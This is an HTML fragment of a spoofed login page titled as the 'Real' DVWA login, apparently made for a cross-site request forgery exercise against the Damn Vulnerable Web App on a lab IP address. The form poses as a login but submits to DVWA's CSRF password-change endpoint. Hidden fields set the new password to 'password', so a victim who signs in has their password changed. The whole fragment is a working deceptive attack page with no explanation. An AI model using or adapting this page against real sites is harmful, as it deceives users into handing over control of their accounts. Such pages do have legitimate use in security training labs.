		<title>The Real Damn Vulnerable Web App (DVWA) - Login</title>

		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />

	</head>

	<body>

	<div align="center">
	
	<br />

	<p><img src="dvwa/images/login_logo.png" /></p>

	<br />
	
	<form id="realLogin" action="http://192.168.226.209/dvwa/vulnerabilities/csrf/" method="get">
	
	<fieldset>

			<label for="user">Username</label> <input type="text" class="loginInput" size="20"><br />
	
			
			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password_current"><br />
			
			<input type="hidden" name="password_new" value="password">
        	<input type="hidden" name="password_conf" value="password">
			
			<p class="submit"><input type="submit" value="Change" name="Change"></p>

	</fieldset>

	</form>

	<br />
